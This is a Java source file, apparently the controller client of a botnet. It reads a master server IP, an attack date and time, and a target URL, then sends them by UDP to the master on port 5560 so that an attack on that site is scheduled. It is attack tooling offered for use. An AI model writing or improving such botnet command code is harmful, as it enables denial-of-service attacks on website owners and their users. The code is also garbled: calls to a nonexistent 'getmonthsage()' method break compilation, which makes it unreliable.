import java.io.IOException;
import java.time.DateTimeException;
import java.time.LocalDate;
import java.util.*;
import java.net.*;


public class Client {

	public static void main(String[] args) {
		
		//-------------------------------- VARIABLES --------------------------------//
		
		Scanner sc = new Scanner(System.in); // Scanner
		String botnet_attack_date = null;
		String botnet_attack_time = null;
		
		// Variables to set date
		Calendar attack_date = new GregorianCalendar();
		int day; int month; int year; int hour = 0; int minutes = 0;
		
		String url = null;
		boolean IP = true;
		boolean check_date = true; // Variable to check if the date is in a right format
		
		// Server data
		InetAddress server_host = null;
		try {
			System.out.println("Master IP");
			server_host = InetAddress.getByName(sc.nextLine());
		} catch (UnknownHostException e) {
			System.out.println("Server IP is not correct.\n");
		}
		int server_port = 5560;
		
		
		//------------------------------- ATTACK DATE -------------------------------//
		
		do {
			
			// DATE (day, month, year) WHEN THE ATTACK WILL BE CARRY OUT
			do {
			
				System.out.println("Insert the attack date (Format: dd/mm/yyyy): ");
				botnet_attack_date = sc.nextLine();
			
				// Split received chain
				String[] split_date = botnet_attack_date.split("/");
				day = Integer.parseInt(split_date[0]);
				month = Integer.parseInt(split_date[1]);
				year = Integer.parseInt(split_date[2]);
			
				// Check if the inserted date is correct. If it is wrong, the program will ask for it again
				try {
					LocalDate.of(year, month, day);
					check_date = true;
				} catch (DateTimeException DTe) {
					check_date = false;
					System.out.println("Inserted date is wrong.");
				} catch (Exception ex) {
					check_date = false;
					System.out.println("Date format is not correct.");
				}
			
			} while (!check_date);
		
			// TIME (hour, minutes) WHEN THE ATTACK WILL BE CARRY OUT
			do {
			
				System.out.println("Insert the attack hour (Format 24 hours: hh:mm): ");
				botnet_attack_time = sc.nextLine();
				check_date = true;
			
				try {
					// Split received chain
					String[] split_time = botnet_attack_time.split(":");
					hour = Integer.parseInt(split_time[0]);
					minutes = Integer.parseInt(split_time[1]);
			
					// Check if the inserted date is correct. If it is wrong, the program will ask for it again
					if (hour > 24 || hour < 0 || minutes > 59 || minutes < 0) {
						check_date = false;
						System.out.println("Inserted time is wrong.");
					}
					
				} catch (Exception ex) {
					check_date = false;
					System.out.println("Time format is not correct.");
				}
						
			} while (!check_date);
			
			attack_date.set(year, month-1, day, hour, minutes);
			
			if (attack_date.compareTo(Calendar.getInstance()) != 1)
				System.out.println("Inserted date is earliar than the current time. Try again!");
			
		} while (attack_date.compareTo(Calendar.getInstance()) != 1);
		
		// TARGET
		do {
			System.out.println("Insert the URL that you want to attack (http://www.url.webdomain): ");
			url = sc.nextLine();
			if (url.contains("http://www."))
				IP = true;
			else
				IP = false;
			
		} while (!IP);
		
		// Close input flow (scanner) -> No more data will be asked
		sc.close();
		
		
		//------------------------------- SENDING ATTACK DATA (UDP) -------------------------------//
		
		// Message struct
		String message = url+"-"+botnet_attack_date+"-"+botnet_attack_time;
		
		try {
			
			DatagramSocket client_socket = new DatagramSocket();
		
			byte[] send_message = message.getBytes();

			// Create a datagram packet to sent the message to server
			DatagramPacket request = new DatagramPacket(send_message, message.length(), server_host, server_port);

			// Sending the datagram
			client_socket.send(request);

			// Print master response
			byte[] buffer = new byte[1000];
			DatagramPacket server_response = new DatagramPacket(buffer, buffer.length);
			client_socket.receive(server_response);
			System.out.println("Received response: " + new String(server_response.getData()));
			
			// Response to check if the attack was carried out
			client_socket.receive(server_response);
			System.out.println("Received response: " + new String(server_response.getData()));

			// Close socket
			client_socket.close();

		} catch (SocketException Se) {
			System.out.println("Socket error: " + Se.getmonthsage());
		} catch (IOException IOe) {
			System.out.println("IO error: " + IOe.getmonthsage());
		}
		
	}

}
